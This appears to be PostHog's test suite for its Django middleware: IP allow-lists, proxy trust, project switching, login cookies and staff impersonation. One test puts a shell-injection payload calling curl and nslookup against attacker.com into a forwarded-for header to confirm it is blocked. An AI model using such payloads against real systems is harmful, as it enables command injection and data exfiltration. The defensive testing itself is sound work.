import json
from datetime import datetime, timedelta
from typing import Any, cast

import pytest
from freezegun import freeze_time
from posthog.test.base import APIBaseTest, FuzzyInt, override_settings
from unittest.mock import MagicMock, patch

from django.conf import settings
from django.core.cache import cache
from django.http import HttpResponseRedirect
from django.test import Client as DjangoClient
from django.urls import reverse

from parameterized import parameterized
from rest_framework import status
from social_core.backends.base import BaseAuth
from social_core.exceptions import AuthCanceled, AuthFailed, AuthMissingParameter

from posthog.api.test.test_organization import create_organization
from posthog.api.test.test_team import create_team
from posthog.models import Action, Cohort, FeatureFlag, Insight
from posthog.models.organization import Organization
from posthog.models.team import Team
from posthog.models.user import User
from posthog.settings import SITE_URL

from products.dashboards.backend.models.dashboard import Dashboard


def _social_auth_backend() -> BaseAuth:
    return cast(BaseAuth, MagicMock())


class TestAccessMiddleware(APIBaseTest):
    CONFIG_AUTO_LOGIN = False

    def test_ip_range(self):
        """
        Also test that capture endpoint is not restrictied by ALLOWED_IP_BLOCKS
        """

        with self.settings(ALLOWED_IP_BLOCKS=["192.168.0.0/31", "127.0.0.0/25", "128.0.0.1"]):
            # not in list
            response = self.client.get("/", REMOTE_ADDR="10.0.0.1")
            self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertIn(b"PostHog is not available", response.content)

            # /31 block
            response = self.client.get("/", REMOTE_ADDR="192.168.0.1")
            self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertNotIn(b"PostHog is not available", response.content)

            response = self.client.get("/", REMOTE_ADDR="192.168.0.2")
            self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertIn(b"PostHog is not available", response.content)

            # /24 block
            response = self.client.get("/", REMOTE_ADDR="127.0.0.1")
            self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertNotIn(b"PostHog is not available", response.content)

            response = self.client.get("/", REMOTE_ADDR="127.0.0.100")
            self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertNotIn(b"PostHog is not available", response.content)

            response = self.client.get("/", REMOTE_ADDR="127.0.0.200")
            self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertIn(b"PostHog is not available", response.content)

            # precise ip
            response = self.client.get("/", REMOTE_ADDR="128.0.0.1")
            self.assertNotEqual(response.status_code, status.HTTP_403_FORBIDDEN)
            self.assertNotIn(b"PostHog is not available", response.content)

            response = self.client.get("/", REMOTE_ADDR="128.0.0.2")
            self.assertIn(b"PostHog is not available", response.content)

    def test_trusted_proxies(self):
        with self.settings(
            ALLOWED_IP_BLOCKS=["192.168.0.0/31", "127.0.0.0/25,128.0.0.1"],
            USE_X_FORWARDED_HOST=True,
        ):
            with self.settings(TRUSTED_PROXIES="10.0.0.1"):
                response = self.client.get(
                    "/",
                    REMOTE_ADDR="10.0.0.1",
                    headers={"x-forwarded-for": "192.168.0.1,10.0.0.1"},
                )
                self.assertNotIn(b"PostHog is not available", response.content)

    def test_attempt_spoofing(self):
        with self.settings(
            ALLOWED_IP_BLOCKS=["192.168.0.0/31", "127.0.0.0/25,128.0.0.1"],
            USE_X_FORWARDED_HOST=True,
        ):
            with self.settings(TRUSTED_PROXIES="10.0.0.1"):
                response = self.client.get(
                    "/",
                    REMOTE_ADDR="10.0.0.1",
                    headers={"x-forwarded-for": "192.168.0.1,10.0.0.2"},
                )
                self.assertEqual(response.status_code, 403)
                self.assertIn(b"PostHog is not available", response.content)

    def test_trust_all_proxies(self):
        with self.settings(
            ALLOWED_IP_BLOCKS=["192.168.0.0/31", "127.0.0.0/25,128.0.0.1"],
            USE_X_FORWARDED_HOST=True,
        ):
            with self.settings(TRUST_ALL_PROXIES=True):
                response = self.client.get(
                    "/",
                    REMOTE_ADDR="10.0.0.1",
                    headers={"x-forwarded-for": "192.168.0.1,10.0.0.1"},
                )
                self.assertNotIn(b"PostHog is not available", response.content)

    def test_blocked_geoip_regions(self):
        with self.settings(
            BLOCKED_GEOIP_REGIONS=["DE"],
            USE_X_FORWARDED_HOST=True,
        ):
            with self.settings(TRUST_ALL_PROXIES=True):
                response = self.client.get(
                    "/",
                    REMOTE_ADDR="45.90.4.87",
                )
                self.assertIn(b"PostHog is not available", response.content)
                response = self.client.get(
                    "/",
                    REMOTE_ADDR="28.160.62.192",
                )
                self.assertNotIn(b"PostHog is not available", response.content)

        with self.settings(
            BLOCKED_GEOIP_REGIONS=["DE"],
            USE_X_FORWARDED_HOST=True,
        ):
            with self.settings(TRUST_ALL_PROXIES=True):
                response = self.client.get("/", REMOTE_ADDR="28.160.62.192", headers={"x-forwarded-for": ""})
                self.assertNotIn(b"PostHog is not available", response.content)

    def test_ip_with_port_stripped(self):
        """IP addresses with ports should have the port stripped before validation."""
        with self.settings(
            ALLOWED_IP_BLOCKS=["192.168.0.0/24"],
            USE_X_FORWARDED_HOST=True,
            TRUST_ALL_PROXIES=True,
        ):
            # IPv4 with port
            response = self.client.get("/", headers={"x-forwarded-for": "192.168.0.1:8080"})
            self.assertNotIn(b"PostHog is not available", response.content)

            # IPv6 with port (bracketed format)
            response = self.client.get("/", headers={"x-forwarded-for": "[::1]:443"})
            # ::1 is not in allowed blocks, so should be blocked
            self.assertIn(b"PostHog is not available", response.content)

    def test_malformed_ip_blocked(self):
        """Malformed IPs and attack payloads should be blocked (fail closed)."""
        with self.settings(
            ALLOWED_IP_BLOCKS=["0.0.0.0/0"],
            USE_X_FORWARDED_HOST=True,
            TRUST_ALL_PROXIES=True,
        ):
            # Attack payload in XFF header
            response = self.client.get(
                "/",
                headers={"x-forwarded-for": "nslookup${IFS}attacker.com||curl${IFS}attacker.com"},
            )
            self.assertIn(b"PostHog is not available", response.content)

            # Invalid IP format
            response = self.client.get("/", headers={"x-forwarded-for": "not-an-ip"})
            self.assertIn(b"PostHog is not available", response.content)

            # Valid IP should work
            response = self.client.get("/", headers={"x-forwarded-for": "192.168.1.1"})
            self.assertNotIn(b"PostHog is not available", response.content)


class TestAutoProjectMiddleware(APIBaseTest):
    # How many queries are made in the base app
    # On Cloud there's an additional multi_tenancy_organizationbilling query
    second_team: Team
    third_team: Team
    no_access_team: Team
    base_app_num_queries: int

    @classmethod
    def setUpTestData(cls):
        super().setUpTestData()
        cls.base_app_num_queries = 53
        # Create another team that the user does have access to
        cls.second_team = create_team(organization=cls.organization, name="Second Life")

        # some teams have non-standard API tokens
        cls.third_team = create_team(organization=cls.organization, name="Third Life")
        cls.third_team.api_token = "sTMFPsFhdP1Ssg"
        cls.third_team.save()

        other_org = create_organization(name="test org")
        cls.no_access_team = create_team(organization=other_org)

    def setUp(self):
        super().setUp()
        # Reset back to initial team/org for each test
        self.user.current_team = self.team
        self.user.current_organization = self.organization

    @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
    def test_project_switched_when_accessing_dashboard_of_another_accessible_team(self):
        dashboard = Dashboard.objects.create(team=self.second_team)

        with self.assertNumQueries(
            FuzzyInt(self.base_app_num_queries, self.base_app_num_queries + 10)
        ):  # AutoProjectMiddleware adds 4 queries + 1 from activity logging
            response_app = self.client.get(f"/dashboard/{dashboard.id}")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_dashboards_api = self.client.get(f"/api/projects/@current/dashboards/{dashboard.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_dashboards_api.status_code, 200)

    def test_project_switched_when_accessing_dashboard_of_another_accessible_team_with_trailing_slash(
        self,
    ):
        dashboard = Dashboard.objects.create(team=self.second_team)

        response_app = self.client.get(f"/dashboard/{dashboard.id}/")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_dashboards_api = self.client.get(f"/api/projects/@current/dashboards/{dashboard.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_dashboards_api.status_code, 200)

    def test_project_unchanged_when_accessing_dashboard_of_another_off_limits_team(
        self,
    ):
        _, _, third_team = Organization.objects.bootstrap(
            None,
            name="Third Party",
            slug="third-party",
            team_fields={"name": "Third Team"},
        )
        dashboard = Dashboard.objects.create(team=third_team)

        response_app = self.client.get(f"/dashboard/{dashboard.id}")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_dashboards_api = self.client.get(f"/api/projects/@current/dashboards/{dashboard.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.team.id)  # NOT third_team
        self.assertEqual(response_dashboards_api.status_code, 404)

    @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
    def test_project_unchanged_when_accessing_dashboards_list(self):
        with self.assertNumQueries(
            FuzzyInt(self.base_app_num_queries, self.base_app_num_queries + 4)
        ):  # No AutoProjectMiddleware queries
            response_app = self.client.get(f"/dashboard")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.team.id)  # NOT third_team

    def test_project_switched_when_accessing_insight_of_another_accessible_team(self):
        insight = Insight.objects.create(team=self.second_team)

        response_app = self.client.get(f"/insights/{insight.short_id}")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_insights_api = self.client.get(f"/api/projects/@current/insights/{insight.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_insights_api.status_code, 200)

    def test_project_switched_when_accessing_insight_edit_mode_of_another_accessible_team(
        self,
    ):
        insight = Insight.objects.create(team=self.second_team)

        response_app = self.client.get(f"/insights/{insight.short_id}/edit")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_insights_api = self.client.get(f"/api/projects/@current/insights/{insight.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_insights_api.status_code, 200)

    def test_project_switched_when_accessing_action_of_another_accessible_team(self):
        action = Action.objects.create(team=self.second_team)

        response_app = self.client.get(f"/action/{action.id}")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_actions_api = self.client.get(f"/api/projects/@current/actions/{action.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_actions_api.status_code, 200)

    def test_project_switched_when_accessing_cohort_of_another_accessible_team(self):
        cohort = Cohort.objects.create(team=self.second_team, created_by=self.user)

        response_app = self.client.get(f"/cohorts/{cohort.id}")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_cohorts_api = self.client.get(f"/api/projects/@current/cohorts/{cohort.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_cohorts_api.status_code, 200)

    @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
    def test_project_switched_when_accessing_feature_flag_of_another_accessible_team(
        self,
    ):
        feature_flag = FeatureFlag.objects.create(team=self.second_team, created_by=self.user)

        with self.assertNumQueries(
            FuzzyInt(self.base_app_num_queries, self.base_app_num_queries + 9)
        ):  # +1 from activity logging _get_before_update()
            response_app = self.client.get(f"/feature_flags/{feature_flag.id}")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()
        response_feature_flags_api = self.client.get(f"/api/projects/@current/feature_flags/{feature_flag.id}/")

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.second_team.id)
        self.assertEqual(response_feature_flags_api.status_code, 200)

    @override_settings(PERSON_ON_EVENTS_V2_OVERRIDE=False)
    def test_project_unchanged_when_creating_feature_flag(self):
        with self.assertNumQueries(FuzzyInt(self.base_app_num_queries, self.base_app_num_queries + 5)):
            response_app = self.client.get(f"/feature_flags/new")
        response_users_api = self.client.get(f"/api/users/@me/")
        response_users_api_data = response_users_api.json()
        self.user.refresh_from_db()

        self.assertEqual(response_app.status_code, 200)
        self.assertEqual(response_users_api.status_code, 200)
        self.assertEqual(response_users_api_data.get("team", {}).get("id"), self.team.id)

    def test_project_switched_when_accessing_another_project_by_id(self):
        project_1_request = self.client.get(f"/project/{self.team.pk}/home")
        response_users_api = self.client.get(f"/api/users/@me/")
        assert project_1_request.status_code == 200
        assert response_users_api.json().get("team", {}).get("id") == self.team.id

        project_2_request = self.client.get(f"/project/{self.second_team.pk}/home")
        response_users_api = self.client.get(f"/api/users/@me/")
        assert project_2_request.status_code == 200
        assert response_users_api.json().get("team", {}).get("id") == self.second_team.id

    def test_project_unchanged_when_accessing_inaccessible_project_by_id(self):
        project_1_request = self.client.get(f"/project/{self.team.pk}/home")
        response_users_api = self.client.get(f"/api/users/@me/")
        assert project_1_request.status_code == 200
        assert response_users_api.json().get("team", {}).get("id") == self.team.id

        project_2_request = self.client.get(f"/project/{self.no_access_team.pk}/home")
        response_users_api = self.client.get(f"/api/users/@me/")
        assert project_2_request.status_code == 200
        assert response_users_api.json().get("team", {}).get("id") == self.team.id

    def test_project_unchanged_when_accessing_missing_project_by_id(self):
        project_1_request = self.client.get(f"/project/{self.team.pk}/home")
        response_users_api = self.client.get(f"/api/users/@me/")
        assert project_1_request.status_code == 200
        assert response_users_api.json().get("team", {}).get("id") == self.team.id

        project_2_request = self.client.get(f"/project/999999/home")
        response_users_api = self.client.get(f"/api/users/@me/")
        assert project_2_request.status_code == 200
        assert response_users_api.json().get("team", {}).get("id") == self.team.id

    def test_project_redirects_to_new_team_when_accessing_project_by_token(self):
        res = self.client.get(f"/project/{self.second_team.api_token}/home")
        assert res.status_code == 302
        assert res.headers["Location"] == f"/project/{self.second_team.pk}/home"

    def test_project_redirects_to_posthog_org_style_tokens(self):
        res = self.client.get(
            f"/project/{self.third_team.api_token}/replay/018f5c3e-1a17-7f2b-ac83-32d06be3269b?t=2601"
        )
        assert res.status_code == 302, res.content
        assert (
            res.headers["Location"]
            == f"/project/{self.third_team.pk}/replay/018f5c3e-1a17-7f2b-ac83-32d06be3269b?t=2601"
        )

    def test_project_redirects_to_current_team_when_accessing_missing_project_by_token(
        self,
    ):
        res = self.client.get(f"/project/phc_123/home")
        assert res.status_code == 302
        assert res.headers["Location"] == f"/project/{self.team.pk}/home"

    def test_project_redirects_to_current_team_when_accessing_inaccessible_project_by_token(
        self,
    ):
        res = self.client.get(f"/project/{self.no_access_team.api_token}/home")
        assert res.status_code == 302
        assert res.headers["Location"] == f"/project/{self.team.pk}/home"

    def test_project_redirects_including_query_params(self):
        res = self.client.get(f"/project/phc_123?t=1")
        assert res.status_code == 302
        assert res.headers["Location"] == f"/project/{self.team.pk}?t=1"

        res = self.client.get(f"/project/phc_123/home?t=1")
        assert res.status_code == 302
        assert res.headers["Location"] == f"/project/{self.team.pk}/home?t=1"


@override_settings(CLOUD_DEPLOYMENT="US")  # As PostHog Cloud
class TestPostHogTokenCookieMiddleware(APIBaseTest):
    CONFIG_AUTO_LOGIN = False

    def test_logged_out_client(self):
        self.client.logout()
        response = self.client.get("/")
        self.assertEqual(0, len(response.cookies))

    def test_logged_in_client(self):
        self.client.force_login(self.user, backend="django.contrib.auth.backends.ModelBackend")
        response = self.client.get("/")
        self.assertEqual(response.status_code, status.HTTP_200_OK)

        ph_project_token_cookie = response.cookies["ph_current_project_token"]
        self.assertEqual(ph_project_token_cookie.key, "ph_current_project_token")
        self.assertEqual(ph_project_token_cookie.value, self.team.api_token)
        self.assertEqual(ph_project_token_cookie["path"], "/")
        self.assertEqual(ph_project_token_cookie["samesite"], "Strict")
        self.assertEqual(ph_project_token_cookie["httponly"], "")
        self.assertEqual(ph_project_token_cookie["domain"], "posthog.com")
        self.assertEqual(ph_project_token_cookie["comment"], "")
        self.assertEqual(ph_project_token_cookie["secure"], True)
        self.assertEqual(ph_project_token_cookie["max-age"], 31536000)

        ph_project_name_cookie = response.cookies["ph_current_project_name"]
        self.assertEqual(ph_project_name_cookie.key, "ph_current_project_name")
        self.assertEqual(ph_project_name_cookie.value, self.team.name)
        self.assertEqual(ph_project_name_cookie["path"], "/")
        self.assertEqual(ph_project_name_cookie["samesite"], "Strict")
        self.assertEqual(ph_project_name_cookie["httponly"], "")
        self.assertEqual(ph_project_name_cookie["domain"], "posthog.com")
        self.assertEqual(ph_project_name_cookie["comment"], "")
        self.assertEqual(ph_project_name_cookie["secure"], True)
        self.assertEqual(ph_project_name_cookie["max-age"], 31536000)

        ph_instance_cookie = response.cookies["ph_current_instance"]
        self.assertEqual(ph_instance_cookie.key, "ph_current_instance")
        self.assertEqual(ph_instance_cookie.value, SITE_URL)
        self.assertEqual(ph_instance_cookie["path"], "/")
        self.assertEqual(ph_instance_cookie["samesite"], "Strict")
        self.assertEqual(ph_instance_cookie["httponly"], "")
        self.assertEqual(ph_instance_cookie["domain"], "posthog.com")
        self.assertEqual(ph_instance_cookie["comment"], "")
        self.assertEqual(ph_instance_cookie["secure"], True)
        self.assertEqual(ph_instance_cookie["max-age"], 31536000)

        ph_last_login_method_cookie = response.cookies["ph_last_login_method"]
        self.assertEqual(ph_last_login_method_cookie.key, "ph_last_login_method")
        self.assertEqual(ph_last_login_method_cookie.value, "password")
        self.assertEqual(ph_last_login_method_cookie["path"], "/")
        self.assertEqual(ph_last_login_method_cookie["samesite"], "Strict")
        self.assertEqual(ph_last_login_method_cookie["httponly"], "")
        self.assertEqual(ph_last_login_method_cookie["domain"], "posthog.com")
        self.assertEqual(ph_last_login_method_cookie["comment"], "")
        self.assertEqual(ph_last_login_method_cookie["secure"], True)
        self.assertEqual(ph_last_login_method_cookie["max-age"], 31536000)

    def test_logout(self):
        self.client.force_login(self.user, backend="django.contrib.auth.backends.ModelBackend")
        response = self.client.get("/")
        self.assertEqual(response.status_code, status.HTTP_200_OK)

        self.assertEqual(response.cookies["ph_current_project_token"].key, "ph_current_project_token")
        self.assertEqual(response.cookies["ph_current_project_token"].value, self.team.api_token)
        self.assertEqual(response.cookies["ph_current_project_token"]["max-age"], 31536000)

        self.assertEqual(response.cookies["ph_current_project_name"].key, "ph_current_project_name")
        self.assertEqual(response.cookies["ph_current_project_name"].value, self.team.name)
        self.assertEqual(response.cookies["ph_current_project_name"]["max-age"], 31536000)

        self.assertEqual(response.cookies["ph_current_instance"].key, "ph_current_instance")
        self.assertEqual(response.cookies["ph_current_instance"].value, SITE_URL)
        self.assertEqual(response.cookies["ph_current_instance"]["max-age"], 31536000)

        self.assertEqual(response.cookies["ph_last_login_method"].key, "ph_last_login_method")
        self.assertEqual(response.cookies["ph_last_login_method"].value, "password")
        self.assertEqual(response.cookies["ph_last_login_method"]["max-age"], 31536000)

        response = self.client.post("/logout/")

        # Check that the local cookies will be removed by having 'expires' in the past
        self.assertTrue(response.cookies["ph_current_project_token"]["expires"] == "Thu, 01 Jan 1970 00:00:00 GMT")
        self.assertTrue(response.cookies["ph_current_project_name"]["expires"] == "Thu, 01 Jan 1970 00:00:00 GMT")
        # We don't want to remove the ph_current_instance cookie
        self.assertNotIn("ph_current_instance", response.cookies)

        # Request a page after logging out
        response = self.client.get("/")

        # Check if the cookies are not present in the response
        self.assertNotIn("ph_current_project_token", response.cookies)
        self.assertNotIn("ph_current_project_name", response.cookies)


@override_settings(IMPERSONATION_TIMEOUT_SECONDS=100)
@override_settings(IMPERSONATION_IDLE_TIMEOUT_SECONDS=20)
@override_settings(ADMIN_PORTAL_ENABLED=True)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_KEY=None)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_SECRET=None)
class TestAutoLogoutImpersonateMiddleware(APIBaseTest):
    other_user: User

    def setUp(self):
        super().setUp()
        # Reset back to initial team/org for each test
        self.other_user = User.objects.create_and_join(
            self.organization, email="other-user@posthog.com", password="123456"
        )

        self.user.is_staff = True
        self.user.save()

        # Use Django's standard Client instead of APIClient for these tests.
        # The loginas admin view expects form-encoded POST data, which is
        # Django Client's default (APIClient defaults to JSON).
        self.client = cast(Any, DjangoClient())
        self.client.force_login(self.user)

    def get_csrf_token_payload(self):
        return {}

    def login_as_other_user(self):
        return self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            data={"read_only": "false", "reason": "Test impersonation"},
            follow=True,
        )

    def test_staff_user_can_login(self):
        assert self.client.get("/api/users/@me").json()["email"] == self.user.email
        response = self.login_as_other_user()
        assert response.status_code == 200
        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"

    def test_not_staff_user_cannot_login(self):
        self.user.is_staff = False
        self.user.save()
        assert self.client.get("/api/users/@me").json()["email"] == self.user.email
        response = self.login_as_other_user()
        assert response.status_code == 200
        assert self.client.get("/api/users/@me").json()["email"] == self.user.email

    def test_after_idle_timeout_api_requests_401(self):
        now = datetime(2024, 1, 1, 12, 0, 0)
        with freeze_time(now):
            self.login_as_other_user()
            res = self.client.get("/api/users/@me")
            assert res.status_code == 200
            assert res.json()["email"] == "other-user@posthog.com"
            assert res.json()["is_impersonated_until"] == "2024-01-01T12:00:20+00:00"
            assert self.client.session.get("session_created_at") == now.timestamp()

        # Move forward by 19
        now = now + timedelta(seconds=19)
        with freeze_time(now):
            res = self.client.get("/api/users/@me")
            assert res.status_code == 200
            assert res.json()["email"] == "other-user@posthog.com"
            assert res.json()["is_impersonated_until"] == "2024-01-01T12:00:39+00:00"

        # Past idle timeout
        now = now + timedelta(seconds=21)

        with freeze_time(now):
            res = self.client.get("/api/users/@me")
            assert res.status_code == 401

    def test_after_total_timeout_api_requests_401(self):
        now = datetime(2024, 1, 1, 12, 0, 0)
        with freeze_time(now):
            self.login_as_other_user()
            res = self.client.get("/api/users/@me")
            assert res.status_code == 200
            assert res.json()["email"] == "other-user@posthog.com"
            assert res.json()["is_impersonated_until"] == "2024-01-01T12:00:20+00:00"
            assert self.client.session.get("session_created_at") == now.timestamp()

        for _ in range(4):
            # Move forward by 19 seconds 4 times for a total of 76 seconds
            now = now + timedelta(seconds=19)
            with freeze_time(now):
                res = self.client.get("/api/users/@me")
                assert res.status_code == 200
                assert res.json()["email"] == "other-user@posthog.com"
                # Format exactly like the date above
                assert res.json()["is_impersonated_until"] == (now + timedelta(seconds=20)).strftime(
                    "%Y-%m-%dT%H:%M:%S+00:00"
                )

        now = now + timedelta(seconds=19)
        with freeze_time(now):
            res = self.client.get("/api/users/@me")
            assert res.status_code == 200
            assert res.json()["email"] == "other-user@posthog.com"
            # Even though below the idle timeout, we now see the total timeout as that is earlier
            assert res.json()["is_impersonated_until"] == "2024-01-01T12:01:40+00:00"

        # Now even less than the idle time will take us past the total timeout
        now = now + timedelta(seconds=10)

        with freeze_time(now):
            res = self.client.get("/api/users/@me")
            assert res.status_code == 401

    def test_after_timeout_non_admin_page_redirects_to_admin(self):
        """When session times out on a non-admin page, redirect to /admin/."""
        now = datetime.now()
        with freeze_time(now):
            self.login_as_other_user()

        with freeze_time(now + timedelta(seconds=35)):
            res = self.client.get("/dashboards")
            assert res.status_code == 302
            assert res.headers["Location"] == "/admin/"

            # Verify we're back to original user
            res = self.client.get("/api/users/@me")
            assert res.status_code == 200
            assert res.json()["email"] == "user1@posthog.com"

    def test_after_timeout_admin_page_redirects_to_intended_admin_page(self):
        """When session times out navigating to an admin page, redirect to that page."""
        third_user = User.objects.create_and_join(self.organization, email="third-user@posthog.com", password="123456")

        now = datetime.now()
        with freeze_time(now):
            self.login_as_other_user()

        with freeze_time(now + timedelta(seconds=35)):
            # Navigate to a different user's admin page
            res = self.client.get(f"/admin/posthog/user/{third_user.id}/change/")
            assert res.status_code == 302
            # Should redirect to the intended admin page, not the impersonated user's page
            assert res.headers["Location"] == f"/admin/posthog/user/{third_user.id}/change/"

            # Verify we're back to original user
            res = self.client.get("/api/users/@me")
            assert res.status_code == 200
            assert res.json()["email"] == "user1@posthog.com"

    def test_explicit_logout_redirects_to_impersonated_user_admin(self):
        """When explicitly logging out via /logout, redirect to impersonated user's admin page."""
        now = datetime.now()
        with freeze_time(now):
            self.login_as_other_user()

            # Explicit logout via the main logout endpoint
            res = self.client.post("/logout/")
            assert res.status_code == 302
            assert res.headers["Location"] == f"/admin/posthog/user/{self.other_user.id}/change/"

            # Verify we're back to original user
            res = self.client.get("/api/users/@me")
            assert res.status_code == 200
            assert res.json()["email"] == "user1@posthog.com"


@override_settings(IMPERSONATION_TIMEOUT_SECONDS=100)
@override_settings(IMPERSONATION_IDLE_TIMEOUT_SECONDS=20)
@override_settings(ADMIN_PORTAL_ENABLED=True)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_KEY=None)
@override_settings(ADMIN_AUTH_GOOGLE_OAUTH2_SECRET=None)
class TestImpersonationReadOnlyMiddleware(APIBaseTest):
    other_user: User

    def setUp(self):
        super().setUp()
        self.other_user = User.objects.create_and_join(
            self.organization, email="other-user@posthog.com", password="123456"
        )
        self.user.is_staff = True
        self.user.save()

        # Use Django's standard Client instead of APIClient for these tests.
        # The loginas admin view expects form-encoded POST data, which is
        # Django Client's default (APIClient defaults to JSON).
        self.client = cast(Any, DjangoClient())
        self.client.force_login(self.user)

    def login_as_other_user(self):
        return self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            data={"read_only": "false", "reason": "Test impersonation"},
            follow=True,
        )

    def login_as_other_user_read_only(self):
        return self.client.post(
            reverse("loginas-user-login", kwargs={"user_id": self.other_user.id}),
            data={"read_only": "true", "reason": "Test read-only impersonation"},
            follow=True,
        )

    def test_read_only_impersonation_blocks_write(self):
        """Verify read-only impersonation blocks DELETE requests with correct error."""
        dashboard = Dashboard.objects.create(team=self.team, name="Test Dashboard")

        self.login_as_other_user_read_only()

        # Verify we're logged in as the other user
        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"

        # Try to delete the dashboard
        response = self.client.delete(f"/api/projects/{self.team.id}/dashboards/{dashboard.id}/")

        assert response.status_code == 403
        response_data = response.json()
        assert response_data["type"] == "authentication_error"
        assert response_data["code"] == "impersonation_read_only"
        assert "read-only" in response_data["detail"].lower()

        # Verify dashboard still exists
        dashboard.refresh_from_db()
        assert dashboard.name == "Test Dashboard"

    def test_read_only_impersonation_allows_get_requests(self):
        """Verify read-only impersonation allows GET requests."""
        self.login_as_other_user_read_only()

        # Verify we're logged in as the other user
        response = self.client.get("/api/users/@me")
        assert response.status_code == 200
        assert response.json()["email"] == "other-user@posthog.com"

        # GET request to dashboards should work
        response = self.client.get(f"/api/projects/{self.team.id}/dashboards/")
        assert response.status_code == 200

    @parameterized.expand(
        [
            ("query", "query/", {"query": {"kind": "EventsQuery", "select": ["event"]}}),
            ("query_kind", "query/HogQLQuery/", {"query": {"kind": "HogQLQuery", "query": "select 1"}}),
            ("endpoint_materialization_preview", "endpoints/some_endpoint/materialization_preview/", {}),
        ]
    )
    def test_read_only_impersonation_allows_allowlisted_post(self, _name, path_suffix, body):
        self.login_as_other_user_read_only()

        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"

        response = self.client.post(
            f"/api/projects/{self.team.id}/{path_suffix}",
            data=body,
            content_type="application/json",
        )

        assert response.status_code != 403 or response.json().get("code") != "impersonation_read_only"

    def test_regular_impersonation_allows_write(self):
        """Verify regular (non-read-only) impersonation can still write."""
        dashboard = Dashboard.objects.create(team=self.team, name="Test Dashboard")

        self.login_as_other_user()

        # Verify we're logged in as the other user
        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"

        # Update should work with regular impersonation
        response = self.client.patch(
            f"/api/projects/{self.team.id}/dashboards/{dashboard.id}/",
            data={"name": "Updated Dashboard"},
            content_type="application/json",
        )

        assert response.status_code == 200

        # Verify dashboard was updated
        dashboard.refresh_from_db()
        assert dashboard.name == "Updated Dashboard"

    def test_impersonation_blocked_when_user_disallows(self):
        """Verify regular impersonation fails when target user has allow_impersonation=False."""
        self.other_user.allow_impersonation = False
        self.other_user.save()

        self.login_as_other_user()

        # Should still be logged in as original user
        assert self.client.get("/api/users/@me").json()["email"] == self.user.email

    def test_read_only_impersonation_blocked_when_user_disallows(self):
        """Verify read-only impersonation fails when target user has allow_impersonation=False."""
        self.other_user.allow_impersonation = False
        self.other_user.save()

        self.login_as_other_user_read_only()

        # Should still be logged in as original user
        assert self.client.get("/api/users/@me").json()["email"] == self.user.email

    @parameterized.expand([("with_trailing_slash", "/logout/"), ("without_trailing_slash", "/logout")])
    def test_read_only_impersonation_logout_redirects_to_user_admin(self, _name, logout_path):
        self.login_as_other_user_read_only()

        # Verify we're logged in as the other user
        assert self.client.get("/api/users/@me").json()["email"] == "other-user@posthog.com"

        # Explicit logout via main logout endpoint — frontend submits to /logout (no slash),
        # while server-side tooling and tests sometimes use /logout/. Both must work.
        response = self.client.post(logout_path)

        assert response.status_code == 302
